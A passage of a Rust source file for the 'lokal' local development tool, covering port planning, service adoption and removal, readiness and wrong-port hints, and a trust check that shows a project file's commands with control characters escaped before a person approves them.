//! `lokal up [SUB]...` and `lokal down` (SPEC §4.11).
//!
//! `up` finds and checks the repo's `lokal.toml`, asks a person to approve
//! its commands (§16.11), takes the project's lock, then routes every
//! service in it with one locked state write and one reload that waits
//! until every name is ready (§4.5), so every URL works before any command
//! starts. Then it starts each service's `run` with `/bin/sh -c` in its own
//! process group (§16.7), prints their output as `name | line` and writes
//! each service's to its log (`up_log.rs`), prints one ready line, gives a
//! server that listens on another port the wrong-port hint, retries one whose
//! own port turns out to be taken once on a new port (and gives one that
//! says a port is in use while its own is free a hint instead), names a
//! server that a command left running outside its process group after an
//! exit 0 (and records it, for the next `up`'s busy-port error), and stops
//! every group on Ctrl-C. `down` removes the services
//! `up` added or adopted: only those marked `managed = "lokal.toml"`
//! (§5.2). `up` adopts a service added by hand (or by `lokal run`) only when
//! its route is the one the file gives it, so no URL moves; any other such
//! service is a clash, and `up` changes nothing.
//!
//! The file starts in this order:
//! - pure planning, unit-tested without a daemon: [`select_starts`] (which
//!   services this `up` starts), [`plan`] (checks and ports, changes
//!   nothing), [`apply_plan`] (the state change), [`remove_managed`]
//!   (`down`'s state change), [`starts_of`] (what each command gets), and
//!   for a retry [`move_port`] (its state change), [`says_port_taken`],
//!   [`own_port_taken`] and [`port_in_use_hint`], [`wrong_port_hint`], and
//!   for a server that detaches [`port_left`], [`left_running`],
//!   [`ready_line`], [`keep_running_line`] and the record's
//!   [`forget_detached`] and [`add_detached`];
//! - the trust check's pure parts: [`trust_step`] (what to do) and
//!   [`listing`] (what a person reviews);
//! - the commands, [`up`] and [`down`]: read the file, run the trust check,
//!   take the locks, reload the daemon and print;
//! - running the commands: [`supervise`] and what it needs.

use std::cell::RefCell;
use std::collections::{BTreeMap, BTreeSet};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::rc::Rc;
use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncReadExt, BufReader};
use tokio::sync::mpsc;
use tokio::task::JoinHandle;
use tokio::time::MissedTickBehavior;

use super::output::{self as out, dim, ok_mark};
use super::projects::{self, Applied};
use super::up_log::ServiceLog;
use crate::error::UserError;
use crate::paths::{PROJECT_FILE, Paths};
use crate::platform::{self, GroupSignal, PortOwner, RelaySignals};
use crate::project_file::{self, ProjectFile};
use crate::state::{self, MANAGED_BY_FILE, Project, Service, State, validate};
use crate::{approval, net, process, runner, util};

/// The busy-port probe: a TCP connect, as `lokal run` does (§4.10).
const PROBE_TIMEOUT: Duration = Duration::from_millis(50);

/// The frameworks guide's section on debugger ports, for
/// [`port_in_use_hint`].
const DEBUGGER_PORTS: &str = "guides/frameworks#several-node-or-workers-servers-debugger-ports";

/// The frameworks guide's section on servers that detach themselves, for
/// [`detached_hint`].
const DETACHING: &str = "guides/frameworks#servers-that-detach-themselves";

pub struct UpOpts {
    /// The services to start; empty means all of them.
    pub subs: Vec<String>,
    /// `--yes`: run the commands without asking, and record no approval.
    pub yes: bool,
}

pub struct DownOpts {
    pub remove_project: bool,
    pub project: Option<String>,
}

// ───────────────────────────── planning ─────────────────────────────

/// Where a service's port comes from (§4.11, "Ports").
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PortFrom {
    /// `port` in the file.
    File,
    /// The port a service that `up` already manages has in state.
    Kept,
    /// A free port lokal picked for a new service.
    Picked,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct Route {
    pub port: u16,
    pub from: PortFrom,
}

/// What [`plan`] decided: the port of every service in the file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Routes {
    pub project: String,
    /// Subdomain → its route, for every service in the file.
    pub ports: BTreeMap<String, Route>,
    /// The services `up` doesn't manage yet whose routes are the ones the
    /// file gives them: the write marks them managed (§4.11, "Adopting a
    /// service").
    pub adopted: BTreeSet<String>,
}

/// Something already listens on the port of a service this `up` starts.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Busy {
    pub sub: String,
    pub port: u16,
    pub from: PortFrom,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Plan {
    Route(Routes),
    /// Nothing may be written or started.
    Busy(Busy),
}

/// What [`apply_plan`] changed.
#[derive(Debug, Clone, PartialEq)]
pub(crate) struct Synced {
    /// The project's domain: the file's apex for a new project, else the
    /// existing project's.
    pub domain: String,
    /// The FQDN of every service in the file, to wait for.
    pub ready: Vec<String>,
    /// The FQDNs of managed services that left the file, now removed.
    pub gone: Vec<String>,
    /// The project's services after the write (for `LOKAL_URL_<SUB>`).
    pub services: BTreeMap<String, Service>,
}

/// The services this `up` starts: each SUB normalised against the file's
/// apex, or every service when there are none. Every service is routed
/// either way.
pub(crate) fn select_starts(
    f: &ProjectFile,
    subs: &[String],
) -> Result<BTreeSet<String>, UserError> {
    if subs.is_empty() {
        return Ok(f.services.keys().cloned().collect());
    }
    let mut starts = BTreeSet::new();
    for raw in subs {
        let sub = validate::subdomain(raw, &f.apex)?;
        if !f.services.contains_key(&sub) {
            return Err(
                UserError::usage(format!("no service `{sub}` in {}", f.path.display())).hint(
                    format!(
                        "its services: {}",
                        f.services.keys().cloned().collect::<Vec<_>>().join(", ")
                    ),
                ),
            );
        }
        starts.insert(sub);
    }
    Ok(starts)
}

/// Decides every service's route, changing nothing. A file service whose
/// name a service `up` doesn't manage already has is adopted when that
/// route is the one `up` would write ([`route_differences`] finds none),
/// and is a clash otherwise. Fails on a clash, a domain mismatch, or an
/// overlap for a new project. Returns [`Plan::Busy`] if a service in
/// `starts` would start on a port where something already listens, so a
/// busy port adopts nothing.
///
/// `listening` probes a `localhost` port; `pick` returns a free port that
/// isn't in the set it's given (`net::probe_tcp` and `net::pick_port` for
/// real, fakes in tests).
pub(crate) fn plan(
    st: &State,
    f: &ProjectFile,
    starts: &BTreeSet<String>,
    listening: &dyn Fn(u16) -> bool,
    pick: &mut dyn FnMut(&BTreeSet<u16>) -> Result<u16>,
) -> Result<Plan> {
    let existing = st.projects.get(&f.project);
    // Each fixed port in the file, and the service it belongs to.
    let fixed: BTreeMap<u16, &str> = f
        .services
        .iter()
        .filter_map(|(sub, fs)| fs.port.map(|port| (port, sub.as_str())))
        .collect();
    let mut adopted = BTreeSet::new();
    match existing {
        Some(p) => {
            // Without a `domain` key there's no check, as `project create`
            // without --domain accepts any existing domain.
            if let Some(d) = &f.domain
                && *d != p.domain
            {
                bail!(
                    projects::domain_mismatch(&f.project, &p.domain, d).hint(format!(
                        "set domain = \"{}\" in {PROJECT_FILE}, choose another project name there, \
or remove the project first: lokal project remove {}",
                        p.domain, f.project
                    ))
                );
            }
            // A service added by hand (or by `lokal run`) whose route is the
            // one `up` would write is adopted: no URL moves. Any other is a
            // clash, because taking it over would move a URL.
            let mut clashes = vec![];
            for (sub, fs) in &f.services {
                let Some(s) = p.services.get(sub).filter(|s| !s.is_managed()) else {
                    continue;
                };
                let differences = route_differences(s, fs, &fixed);
                if differences.is_empty() {
                    adopted.insert(sub.clone());
                } else {
                    clashes.push((sub.as_str(), differences));
                }
            }
            if !clashes.is_empty() {
                bail!(clash_error(&f.project, &clashes));
            }
        }
        None => validate::check_overlap(st, &f.apex, None)?,
    }

    // Picks skip every port in state (any project), every fixed port in the
    // file, and every port picked so far.
    let mut taken: BTreeSet<u16> = st.services().iter().map(|e| e.service.port).collect();
    taken.extend(fixed.keys());
    let mut ports = BTreeMap::new();
    for (sub, fs) in &f.services {
        // An adopted service keeps its port as a managed one does.
        let kept = existing
            .and_then(|p| p.services.get(sub))
            .filter(|s| s.is_managed() || adopted.contains(sub))
            .map(|s| s.port)
            // A port another service now fixes in the file is that service's.
            .filter(|port| !fixed.contains_key(port));
        let route = match (fs.port, kept) {
            (Some(port), _) => Route {
                port,
                from: PortFrom::File,
            },
            (None, Some(port)) => Route {
                port,
                from: PortFrom::Kept,
            },
            (None, None) => {
                let port = pick(&taken)?;
                taken.insert(port);
                Route {
                    port,
                    from: PortFrom::Picked,
                }
            }
        };
        ports.insert(sub.clone(), route);
    }

    // Only for services this `up` starts: one that it only routes keeps its
    // port, busy or not, because the listener may be the developer's own
    // server. A busy kept port isn't moved either: its listener is most
    // likely the same service (still under `lokal run`, or left by an `up`
    // that was killed), and a new port would start a second copy.
    for sub in starts {
        let r = ports[sub];
        if listening(r.port) {
            return Ok(Plan::Busy(Busy {
                sub: sub.clone(),
                port: r.port,
                from: r.from,
            }));
        }
    }
    Ok(Plan::Route(Routes {
        project: f.project.clone(),
        ports,
        adopted,
    }))
}

/// How the route of `s`, a service `up` doesn't manage, differs from the
/// one `up` would write for the file service `fs` (§4.11, "Adopting a
/// service"); none means `up` adopts it. `fixed` maps each fixed port in
/// the file to its service. Without a `port` in the file, `s` keeps its own
/// port unless another service fixes it.
fn route_differences(
    s: &Service,
    fs: &project_file::FileService,
    fixed: &BTreeMap<u16, &str>,
) -> Vec<String> {
    let mut d = vec![];
    if s.host != "localhost" {
        d.push(format!("host {}, not localhost", s.host));
    }
    match fs.port {
        Some(want) if want != s.port => d.push(format!("port {}, not {want}", s.port)),
        Some(_) => {}
        None => {
            if let Some(owner) = fixed.get(&s.port) {
                d.push(format!(
                    "port {}, which {PROJECT_FILE} gives to {owner}",
                    s.port
                ));
            }
        }
    }
    if s.host_header != fs.host_header {
        d.push(format!(
            "host_header \"{}\", not \"{}\"",
            s.host_header.as_str(),
            fs.host_header.as_str()
        ));
    }
    d
}

/// The state change for a [`Plan::Route`]: creates the project if it's
/// missing and makes it current, adds or replaces every file service as a
/// managed `localhost` route (which marks an adopted one managed), and
/// removes the project's managed services that left the file. Other
/// services added by hand stay. A replaced service keeps the fields this
/// lokal doesn't know (SPEC §5.2); a removed one loses them with it.
pub(crate) fn apply_plan(st: &mut State, f: &ProjectFile, r: &Routes) -> Synced {
    let p = st
        .projects
        .entry(r.project.clone())
        .or_insert_with(|| Project {
            domain: f.apex.clone(),
            created_at: util::now_rfc3339(),
            services: BTreeMap::new(),
            extra: Default::default(),
        });
    let left: Vec<String> = p
        .services
        .iter()
        .filter(|(sub, s)| s.is_managed() && !f.services.contains_key(*sub))
        .map(|(sub, _)| sub.clone())
        .collect();
    for sub in &left {
        p.services.remove(sub);
    }
    for (sub, fs) in &f.services {
        // A newer lokal's fields on the service stay (SPEC §5.2).
        let extra = p.services.remove(sub).map(|s| s.extra).unwrap_or_default();
        p.services.insert(
            sub.clone(),
            Service {
                host: "localhost".into(),
                port: r.ports[sub].port,
                host_header: fs.host_header,
                managed: Some(MANAGED_BY_FILE.into()),
                extra,
            },
        );
    }
    let synced = Synced {
        domain: p.domain.clone(),
        ready: f.services.keys().map(|sub| p.fqdn(sub)).collect(),
        gone: left.iter().map(|sub| p.fqdn(sub)).collect(),
        services: p.services.clone(),
    };
    st.current_project = Some(r.project.clone());
    synced
}

/// What [`remove_managed`] did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Removal {
    /// No such project.
    NoProject,
    /// The project has no managed services (and wasn't removed).
    Nothing {
        /// Its other services.
        kept: Vec<String>,
    },
    Removed {
        domain: String,
        /// The managed services removed, and their FQDNs.
        subs: Vec<String>,
        gone: Vec<String>,
        /// `--remove-project` removed the project too.
        project_removed: bool,
        /// The services that stay (added by hand).
        kept: Vec<String>,
    },
}

/// `down`'s state change: removes the project's managed services, and with
/// `remove_project` the project too if nothing else is left in it
/// (clearing `current_project` if it pointed there, as `project remove`
/// does).
pub(crate) fn remove_managed(st: &mut State, project: &str, remove_project: bool) -> Removal {
    let Some(p) = st.projects.get_mut(project) else {
        return Removal::NoProject;
    };
    let subs: Vec<String> = p
        .services
        .iter()
        .filter(|(_, s)| s.is_managed())
        .map(|(sub, _)| sub.clone())
        .collect();
    let kept: Vec<String> = p
        .services
        .keys()
        .filter(|sub| !subs.contains(sub))
        .cloned()
        .collect();
    let project_removed = remove_project && kept.is_empty();
    if subs.is_empty() && !project_removed {
        return Removal::Nothing { kept };
    }
    for sub in &subs {
        p.services.remove(sub);
    }
    let domain = p.domain.clone();
    let gone = subs.iter().map(|sub| p.fqdn(sub)).collect();
    if project_removed {
        st.projects.remove(project);
        if st.current_project.as_deref() == Some(project) {
            st.current_project = None;
        }
    }
    Removal::Removed {
        domain,
        subs,
        gone,
        project_removed,
        kept,
    }
}

/// One usage error for every clash, each with what differs from the route
/// the file gives it ([`route_differences`]), and one command that removes
/// them all.
fn clash_error(project: &str, clashes: &[(&str, Vec<String>)]) -> UserError {
    let names: Vec<&str> = clashes.iter().map(|(sub, _)| *sub).collect();
    let what = |d: &[String]| d.join(", and ");
    let msg = match clashes {
        [(one, d)] => format!(
            "service {one} already exists with another route than {PROJECT_FILE} gives it ({}), \
and {PROJECT_FILE} doesn't manage it (added by hand, or left by lokal run)",
            what(d)
        ),
        _ => format!(
            "services {} already exist with other routes than {PROJECT_FILE} gives them ({}), \
and {PROJECT_FILE} doesn't manage them (added by hand, or left by lokal run)",
            names.join(", "),
            clashes
                .iter()
                .map(|(sub, d)| format!("{sub}: {}", what(d)))
                .collect::<Vec<_>>()
                .join("; ")
        ),
    };
    UserError::usage(msg).hint(format!(
        "lokal service remove {} -p {project}",
        names.join(" ")
    ))
}

/// The note `up` prints after the routes when it adopted services (§4.11,
/// "Adopting a service").
fn adopted_note(adopted: &BTreeSet<String>) -> Option<String> {
    let names = adopted.iter().cloned().collect::<Vec<_>>().join(", ");
    match adopted.len() {
        0 => None,
        1 => Some(format!(
            "adopted {names} (added by hand or by lokal run, with the route {PROJECT_FILE} gives it); \
lokal down removes it now"
        )),
        _ => Some(format!(
            "adopted {names} (added by hand or by lokal run, with the routes {PROJECT_FILE} gives them); \
lokal down removes them now"
        )),
    }
}

/// A service this `up` starts, ready to spawn (SPEC §4.11, "Starting the
/// commands").
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Start {
    pub sub: String,
    pub port: u16,
    /// The file's `run` as written, `{port}` included.
    pub template: String,
    /// The file's `run` with `{port}` replaced, and nothing else changed.
    pub run: String,
    pub cwd: PathBuf,
    /// §4.10's variables (`PORT`, `HOST`, `LOKAL_URL`, `LOKAL_URL_<SUB>`
    /// for every service in the project after the write), then the file's
    /// `env`.
    pub env: Vec<(String, String)>,
    /// The port is `port` in the file, which is never moved (§4.11,
    /// "Ports").
    pub fixed: bool,
}

impl Start {
    /// The same service on another port, for a retry (§4.11, "A port that's
    /// taken after all"): `{port}` and `PORT` change. `HOST` and the
    /// `LOKAL_URL*` values don't, because URLs don't contain ports. The
    /// file's `env` can't set `PORT` (§4.11, "The file").
    pub(crate) fn on_port(&self, port: u16) -> Self {
        let env = self
            .env
            .iter()
            .map(|(k, v)| match k.as_str() {
                "PORT" => (k.clone(), port.to_string()),
                _ => (k.clone(), v.clone()),
            })
            .collect();
        Self {
            port,
            run: runner::substitute_port(&self.template, port),
            env,
            ..self.clone()
        }
    }
}

/// What each service in `starts` runs, from the plan and the state after
/// the write.
pub(crate) fn starts_of(
    f: &ProjectFile,
    routes: &Routes,
    synced: &Synced,
    starts: &BTreeSet<String>,
) -> Vec<Start> {
    starts
        .iter()
        .map(|sub| {
            let fs = &f.services[sub];
            let route = routes.ports[sub];
            let port = route.port;
            let (mut env, _) = runner::child_env(&synced.domain, &synced.services, sub, port);
            env.extend(fs.env.iter().cloned());
            Start {
                sub: sub.clone(),
                port,
                template: fs.run.clone(),
                run: runner::substitute_port(&fs.run, port),
                cwd: fs.cwd.clone(),
                env,
                fixed: route.from == PortFrom::File,
            }
        })
        .collect()
}

/// The state change of a retry (§4.11, "A port that's taken after all"):
/// moves `sub` in `project` from `old` to a port that `pick` returns, which
/// skips every port in state. Only if the service is still managed and
/// still has `old`; otherwise someone changed it in the meantime, and this
/// changes nothing and returns `None`. Returns the new port and the
/// service's FQDN, to wait for.
pub(crate) fn move_port(
    st: &mut State,
    project: &str,
    sub: &str,
    old: u16,
    pick: &mut dyn FnMut(&BTreeSet<u16>) -> Result<u16>,
) -> Result<Option<(u16, String)>> {
    let taken: BTreeSet<u16> = st.services().iter().map(|e| e.service.port).collect();
    let Some(p) = st.projects.get_mut(project) else {
        return Ok(None);
    };
    let fqdn = p.fqdn(sub);
    match p.services.get_mut(sub) {
        Some(s) if s.is_managed() && s.port == old => {
            s.port = pick(&taken)?;
            Ok(Some((s.port, fqdn)))
        }
        _ => Ok(None),
    }
}

/// A server's line saying that a port is taken: `EADDRINUSE` (Node) or
/// `address already in use` (most others), in any case (§4.11). Not
/// necessarily the service's own port: workerd says so for its inspector's
/// ([`own_port_taken`] tells).
pub(crate) fn says_port_taken(line: &str) -> bool {
    let has = |needle: &str| {
        line.as_bytes()
            .windows(needle.len())
            .any(|w| w.eq_ignore_ascii_case(needle.as_bytes()))
    };
    has("eaddrinuse") || has("address already in use")
}

/// Is a service's own port taken, after a line said a port is in use
/// (§4.11, "A port that's taken after all")? `accepts`: it accepts
/// connections; `owners`: the processes that hold it; `pgid`: the service's
/// process group. Not if one of the owners is in the service's group: the
/// service holds its port itself, so the port it said is in use is another
/// one. Otherwise yes if any process holds it, listening or only bound (a
/// bound socket also makes a server's bind fail; a connection doesn't, see
/// [`platform::System::port_owners`]), or if it accepts connections
/// although no owner shows: another user's process, which lsof can't see.
pub(crate) fn own_port_taken(accepts: bool, owners: &[PortOwner], pgid: u32) -> bool {
    if owners.iter().any(|o| o.pgid == pgid) {
        return false;
    }
    accepts || !owners.is_empty()
}

/// The hint after the exit of a service that said a port is in use while
/// its own port was free (§4.11): the clash was on another port it opens,
/// most often a debugger's, which `lokal up` starting every server at once
/// makes likely.
pub(crate) fn port_in_use_hint(sub: &str, port: u16) -> String {
    format!(
        "{sub} says a port is in use, but its own port {port} is free. Another port it opens may be shared \
with another service, such as a debugger port (9229): give each server its own. See {}",
        out::docs_link(DEBUGGER_PORTS)
    )
}

/// What a service's command left on the service's port when it exited 0
/// (§4.11, "A server that detaches"), once the port accepted connections.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PortLeft {
    /// A process in the service's group holds it: a background job, which
    /// lokal still follows and stops. The service counts as ready.
    InGroup,
    /// These processes listen there, and none in its group holds it: they
    /// left the group (`setsid`), and run outside `lokal up`.
    Outside(Vec<PortOwner>),
    /// No process lokal can see: nothing accepted connections there, or
    /// what did is another user's or has gone since.
    Nothing,
}

/// [`PortLeft`] from the processes that hold the port (`owners`, from
/// [`platform::System::port_owners`]) and the service's process group
/// `pgid`. Not the processes descended from its shell: once the shell has
/// exited, those are re-parented to launchd, and only the group still
/// tells them apart.
pub(crate) fn port_left(owners: &[PortOwner], pgid: u32) -> PortLeft {
    if owners.iter().any(|o| o.pgid == pgid) {
        return PortLeft::InGroup;
    }
    let listening: Vec<PortOwner> = owners.iter().filter(|o| o.listening).cloned().collect();
    if listening.is_empty() {
        PortLeft::Nothing
    } else {
        PortLeft::Outside(listening)
    }
}

/// `node (pid 25898)`, with the name as the trust listing shows text.
fn owner_name(o: &PortOwner) -> String {
    format!("{} (pid {})", printable(&o.name), o.pid)
}

/// `a`, `a and b`, `a, b and c`.
fn and_list(items: &[String]) -> String {
    match items {
        [] => String::new(),
        [one] => one.clone(),
        [rest @ .., last] => format!("{} and {last}", rest.join(", ")),
    }
}

/// The exit line of a service whose command exited 0 and left `owners`
/// listening on its `port` outside its process group (§4.11), after
/// `<sub> `: `exited 0, and left localhost:9903 to node (pid 25898), which
/// runs outside lokal up: lokal logs web won't show its output, and stopping
/// lokal up won't stop it.` `owners` is not empty.
pub(crate) fn left_running(sub: &str, port: u16, owners: &[PortOwner]) -> String {
    let names: Vec<String> = owners.iter().map(owner_name).collect();
    let (runs, its, it) = match owners {
        [_] => ("runs", "its", "it"),
        _ => ("run", "their", "them"),
    };
    format!(
        "exited 0, and left localhost:{port} to {}, which {runs} outside lokal up: lokal logs {sub} \
won't show {its} output, and stopping lokal up won't stop {it}.",
        and_list(&names)
    )
}

/// The hint after [`left_running`]'s exit line, and in the busy-port error
/// for a server the record names (§4.11).
pub(crate) fn detached_hint(sub: &str) -> String {
    format!(
        "{sub}'s run must keep its server in the foreground. See {}",
        out::docs_link(DETACHING)
    )
}

/// How the ready line counts a service (§4.11, "The ready line").
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Counted {
    /// It accepts connections: its command runs, or left the server in its
    /// process group.
    Ready,
    /// Its command exited 0 and left its server running outside `lokal up`.
    Detached,
    /// It doesn't accept connections: it exited with this code.
    NotReady(Option<i32>),
}

/// The ready line (§4.11): `✓ ready: R/N services accepting connections
/// (2.8s)`, or `✓ listening: R/N services on localhost` when the routes
/// didn't take (`url_works` is false). N counts `services`, the services
/// this `up` started, and R those that accept connections, detached ones
/// included. Then the others by name, in order: `; detached: web, render`
/// and `; not ready: api (exited 1)`.
pub(crate) fn ready_line(services: &[(&str, Counted)], took: Duration, url_works: bool) -> String {
    let n = services.len();
    let r = services
        .iter()
        .filter(|(_, c)| !matches!(c, Counted::NotReady(_)))
        .count();
    let mut line = if url_works {
        format!(
            "{} ready: {r}/{n} services accepting connections {}",
            ok_mark(),
            dim(&format!("({})", util::fmt_duration(took)))
        )
    } else {
        format!("{} listening: {r}/{n} services on localhost", ok_mark())
    };
    let detached: Vec<&str> = services
        .iter()
        .filter(|(_, c)| *c == Counted::Detached)
        .map(|(sub, _)| *sub)
        .collect();
    if !detached.is_empty() {
        line.push_str(&format!("; detached: {}", detached.join(", ")));
    }
    let not_ready: Vec<String> = services
        .iter()
        .filter_map(|(sub, c)| match c {
            Counted::NotReady(Some(code)) => Some(format!("{sub} (exited {code})")),
            Counted::NotReady(None) => Some(sub.to_string()),
            _ => None,
        })
        .collect();
    if !not_ready.is_empty() {
        line.push_str(&format!("; not ready: {}", not_ready.join(", ")));
    }
    line
}

/// What lokal prints last when servers its commands started keep running
/// outside it (§4.11): `2 servers keep running outside lokal up: web (node,
/// pid 25898), api (node, pid 25901)`. `left` (each service and a server it
/// left) is not empty.
pub(crate) fn keep_running_line(left: &[(String, PortOwner)]) -> String {
    let each: Vec<String> = left
        .iter()
        .map(|(sub, o)| format!("{sub} ({}, pid {})", printable(&o.name), o.pid))
        .collect();
    let n = left.len();
    let server_keeps = if n == 1 {
        "server keeps"
    } else {
        "servers keep"
    };
    format!(
        "{n} {server_keeps} running outside lokal up: {}",
        each.join(", ")
    )
}

/// A server that a service's command left running outside `lokal up`, as
/// the record next to the lock holds it (§4.11, "A server that detaches"),
/// only so that a later `up`'s busy-port error can say where it came from.
/// lokal never signals a pid from it: pids get reused.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub(crate) struct Detached {
    pub sub: String,
    pub port: u16,
    pub pid: u32,
    /// Its full command name, as [`PortOwner::name`].
    pub name: String,
}

/// The record's entries without those of the services in `starts`: what
/// this `up` starts replaces what they left before.
pub(crate) fn forget_detached(record: &mut Vec<Detached>, starts: &BTreeSet<String>) {
    record.retain(|d| !starts.contains(&d.sub));
}

/// Records that `sub`'s command left `owners` on `port`, replacing what the
/// record had for `sub`.
pub(crate) fn add_detached(record: &mut Vec<Detached>, sub: &str, port: u16, owners: &[PortOwner]) {
    record.retain(|d| d.sub != sub);
    record.extend(owners.iter().map(|o| Detached {
        sub: sub.into(),
        port,
        pid: o.pid,
        name: o.name.clone(),
    }));
}

/// The wrong-port hint's text after `hint:` (§4.11). It names a port to
/// switch to only when there is one candidate, and never when the file
/// fixes the port: the server is the one to change then.
/// - One port: `web listens on localhost:5173, not 51234. Set port = 5173
///   for web in lokal.toml`.
/// - Several: `web listens on localhost:9912 and localhost:56671, not
///   51234. If one of them is its server, set port to it for web in
///   lokal.toml`.
/// - A fixed port: `web isn't listening on 3000, the port lokal.toml gives
///   it (it listens on localhost:5173). Make its server listen on 3000`.
///
/// Then `, or put {port} in its run: vite --port {port}`, only when the
/// `run` has no `{port}` yet. Never `lokal service update`, which the next
/// `up` would undo. `ports` is not empty.
pub(crate) fn wrong_port_hint(job: &Start, ports: &[u16]) -> String {
    let on = runner::listener_list(ports);
    let (sub, port) = (&job.sub, job.port);
    let mut hint = match ports {
        _ if job.fixed => format!(
            "{sub} isn't listening on {port}, the port {PROJECT_FILE} gives it (it listens on {on}). \
Make its server listen on {port}"
        ),
        [one] => format!(
            "{sub} listens on {on}, not {port}. Set port = {one} for {sub} in {PROJECT_FILE}"
        ),
        _ => format!(
            "{sub} listens on {on}, not {port}. If one of them is its server, set port to it for {sub} \
in {PROJECT_FILE}"
        ),
    };
    if !job.template.contains(runner::PORT_PLACEHOLDER) {
        hint.push_str(&format!(
            ", or put {p} in its run: {} --port {p}",
            printable(&job.template),
            p = runner::PORT_PLACEHOLDER
        ));
    }
    hint
}

// ───────────────────────────── the trust check ─────────────────────────────

/// What the trust check does (SPEC §4.11, §16.11).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum TrustStep {
    /// A person approved these exact bytes: continue, printing nothing.
    Approved,
    /// `--yes`: print the listing and a note, continue, and record nothing.
    Yes,
    /// On a terminal: print the listing and ask. Only a `y` records an
    /// approval.
    Ask,
    /// No terminal and no `--yes`: print the listing and exit 1, changing
    /// nothing.
    Refuse {
        /// An approval exists, for other bytes.
        changed: bool,
    },
}

/// Decides the trust check from `--yes`, the stored approval and whether
/// stdin is a terminal. `--yes` always shows what it runs, approved or not.
pub(crate) fn trust_step(yes: bool, status: approval::Status, tty: bool) -> TrustStep {
    use approval::Status;
    if yes {
        return TrustStep::Yes;
    }
    match (status, tty) {
        (Status::Approved, _) => TrustStep::Approved,
        (_, true) => TrustStep::Ask,
        (status, false) => TrustStep::Refuse {
            changed: status == Status::Changed,
        },
    }
}

/// The command column of [`listing`] is at most this wide before `in <cwd>`.
const RUN_COLUMN: usize = 40;

/// What a `lokal.toml` runs, for a person to review (SPEC §4.11): every
/// service's `run` as written (`{port}` included, because no port is
/// chosen yet), its `cwd` when that isn't the file's directory, and each
/// `env` pair on its own line.
///
/// Nothing in the file can hide a command from the reader: control and
/// invisible characters are shown escaped ([`printable`]), so a `\r` or an
/// escape sequence can't make the terminal draw something else over it,
/// and every line after a line break in a value starts with `↳`, so a
/// second command can't pass for an `env` line.
pub(crate) fn listing(f: &ProjectFile) -> String {
    let name_w = f
        .services
        .keys()
        .map(|s| s.chars().count())
        .max()
        .unwrap_or(0)
        + 2;
    let indent = " ".repeat(name_w);
    let runs: Vec<Vec<String>> = f.services.values().map(|s| shown_lines(&s.run)).collect();
    let run_w = runs
        .iter()
        .map(|l| l[0].chars().count())
        .max()
        .unwrap_or(0)
        .min(RUN_COLUMN);
    let mut out = format!(
        "{} runs these commands:\n",
        printable(&f.path.display().to_string())
    );
    for ((sub, svc), run) in f.services.iter().zip(&runs) {
        let first = &run[0];
        if svc.cwd == f.dir {
            out.push_str(&format!("  {sub:<name_w$}{first}\n"));
        } else {
            // Relative to the file's directory, as in the file (without a
            // leading `./`); a cwd outside it, `..` included, as written.
            let cwd = svc.cwd.strip_prefix(&f.dir).unwrap_or(&svc.cwd);
            let cwd = printable(&cwd.display().to_string());
            out.push_str(&format!("  {sub:<name_w$}{first:<run_w$}  in {cwd}\n"));
        }
        for more in &run[1..] {
            out.push_str(&format!("  {indent}↳ {more}\n"));
        }
        for (k, v) in &svc.env {
            let v = shown_lines(v);
            out.push_str(&format!("  {indent}env {}={}\n", printable(k), v[0]));
            for more in &v[1..] {
                out.push_str(&format!("  {indent}↳ {more}\n"));
            }
        }
    }
    out
}

/// A value's lines, each [`printable`]: never empty, and a final line
/// break (which runs nothing) doesn't make an empty line.
fn shown_lines(s: &str) -> Vec<String> {
    let s = s.strip_suffix('\n').unwrap_or(s);
    s.split('\n').map(printable).collect()
}

/// `s` with every character a terminal wouldn't show as itself escaped:
/// `\n`, `\r` and `\t`, and every other control character and invisible
/// format character (bidi overrides, zero-width spaces) as `\u{…}`.
pub(crate) fn printable(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() || invisible(c) => {
                out.push_str(&format!("\\u{{{:x}}}", u32::from(c)));
            }
            c => out.push(c),
        }
    }
    out
}

/// Format characters that draw nothing, or reorder or hide what follows.
fn invisible(c: char) -> bool {
    matches!(
        c,
        '\u{ad}'
            | '\u{61c}'
            | '\u{180e}'
            | '\u{200b}'..='\u{200f}'
            | '\u{2028}'..='\u{202e}'
            | '\u{2060}'..='\u{206f}'
            | '\u{feff}'
            | '\u{fff9}'..='\u{fffb}'
    )
}

/// Proof that the trust check passed (SPEC §16.11): a person approved these
/// bytes, answered `y`, or the caller passed `--yes`. Only [`trust_check`]
/// makes one, and [`supervise`], the only caller of `process::spawn_shell`,
/// takes it, so no path starts a `run` command without the check.
pub(crate) struct Approved(());

/// The trust check (SPEC §4.11 step 2, §16.11). Returns `None` when a
/// person said no; with no terminal and no `--yes` it fails. Either way
/// nothing has changed.
fn trust_check(paths: &Paths, f: &ProjectFile, yes: bool) -> Result<Option<Approved>> {
    let status = approval::status(paths, &f.path, &f.digest);
    match trust_step(yes, status, util::stdin_is_tty()) {
        TrustStep::Approved => Ok(Some(Approved(()))),
        TrustStep::Yes => {
            print!("{}", listing(f));
            out::note("running these without asking (--yes); nothing is remembered");
            Ok(Some(Approved(())))
        }
        TrustStep::Ask => {
            print!("{}", listing(f));
            if !out::confirm("run these commands?", false)? {
                println!("Not approved; nothing was started.");
                return Ok(None);
            }
            approval::record(paths, &f.path, &f.digest)?;
            Ok(Some(Approved(())))
        }
        TrustStep::Refuse { changed } => {
            print!("{}", listing(f));
            bail!(refusal(f, changed))
        }
    }
}

